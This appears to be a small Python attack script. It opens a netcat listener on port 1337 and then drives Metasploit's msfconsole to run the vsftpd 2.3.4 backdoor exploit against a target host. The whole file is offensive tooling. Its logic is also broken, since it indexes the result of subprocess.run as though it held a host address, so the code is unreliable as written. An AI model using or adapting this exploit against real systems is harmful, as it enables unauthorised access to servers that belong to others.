import subprocess

def listener():

	target = subprocess.run(["nc", "-lp", "1337"])
	target = target[1]
	return target

def generate(target):
	exploit = "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost "+target+"; run"
	subprocess.run(["msfconsole", "-q", "-x", exploit])

	
target = listener()
generate(target)
